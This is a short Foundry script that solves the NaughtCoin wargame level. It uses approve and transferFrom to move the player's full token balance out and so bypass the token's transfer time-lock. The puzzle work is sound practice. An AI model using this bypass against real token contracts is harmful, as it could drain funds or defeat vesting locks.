// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract NaughtCoinSolution is Script {

    address target = 0xd5fF80a92797Ca44998C908FE3fd13746f525e6F;
    NaughtCoin public naughtCoin = NaughtCoin(target);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address player = naughtCoin.player();
        uint256 balance = naughtCoin.balanceOf(player);
        
        console.log("Balance Before: ", balance);

        naughtCoin.approve(player, balance);
        naughtCoin.transferFrom(player, address(this), balance);

        console.log("Balance After: ", naughtCoin.balanceOf(player));

        vm.stopBroadcast();
    }
}